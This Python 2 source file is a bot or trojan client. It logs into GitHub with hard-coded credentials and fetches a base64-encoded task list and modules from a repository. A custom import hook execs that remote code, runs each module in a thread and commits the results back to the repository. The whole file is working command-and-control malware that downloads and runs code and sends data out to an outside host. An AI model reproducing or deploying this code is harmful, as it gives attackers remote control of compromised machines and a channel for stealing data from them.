import os
import imp
import sys
import time
import json
import Queue
import base64
import random
import threading

from github3 import login

bot_id = "abba"	#bots id

bot_config	= "%s.json" % bot_id #loads config for specific bot,
data_path	= "data/%s/" % bot_id
bot_modules	= []
configured	= False
task_queue	= Queue.Queue()

def connect_to_github():
	gh = login(username="testyboi",password="asdf1234")
	repo = gh.repository("testyboi","morpheus")
	branch = repo.branch("master")
	return gh, repo, branch

def get_file_contents(filepath):
#	print "in get_file_contents"
	gh, repo, branch = connect_to_github()
#	print "gh, repo, branch = %s %s %s" % (gh, repo, branch)
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print "[*] Found file %s" % filepath
			blob = repo.blob(filename._json_data['sha'])
			return blob.content
	return None

def get_bot_config():
#	print "in get_bot_config"
	global configured
#	print bot_config #loads config for specific bot,
	config_json	= get_file_contents(bot_config)
#	print "get_bot_config:: after get_file_contents(bot_config)"
#	print "get_bot_config:: config_json = %s " % config_json
	config		= json.loads(base64.b64decode(config_json))
#	print "get_bot_config:: config = %s " % config
	configured	= True
	for task in config:
		if task['module'] not in sys.modules:
			exec("import %s" % task['module'])
	return config

def store_module_result(data):
	gh, repo, branch = connect_to_github()
	remote_path = "data/%s/%d.data" % (bot_id,random.randint(1000,100000))
	repo.create_file(remote_path,"Commit message",base64.b64encode(data))
	return

class GitImporter(object):
	def __init__(self):		## initializes class
		self.current_module_code = ""

	def find_module(self, fullname, path = None):	# attempts to locate module
		if configured:
			print "[*] Attempting to retrieve %s" % fullname	
			new_library = get_file_contents("modules/%s" % fullname)
#			print new_library

			if new_library is not None:	# if found, base64-decode and store
				self.current_module_code = base64.b64decode(new_library)
				return self

		return None

	def load_module(self, name):	# loads athe modules (duh)
		module = imp.new_module(name)# imp is a native module for creating a blank 1
		## vv current_module_code is from the find_module function where the module
		## gets loaded in:: So the above creates a new blank modules and the below
		## puts the code in from find_module

		exec self.current_module_code in module.__dict__
		sys.modules[name] = module # imports module into sys.modules list
		return module 

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run() #runs the module that was imported
	task_queue.get()

	# store the result in our repo
	store_module_result(result)
	return


# main bot loop
sys.meta_path = [GitImporter()] # the custom module importer

#while True:
if task_queue.empty():
	config = get_bot_config() #gets config from repo

	for task in config: # thread up them modules
		t = threading.Thread(target=module_runner,args=(task['module'],))
		print "t is %s " %t
		t.start()
		print "t.start() is %s " %t
		#	time.sleep(random.randint(1,10))
#	time.sleep(random.randint(1000,10000))


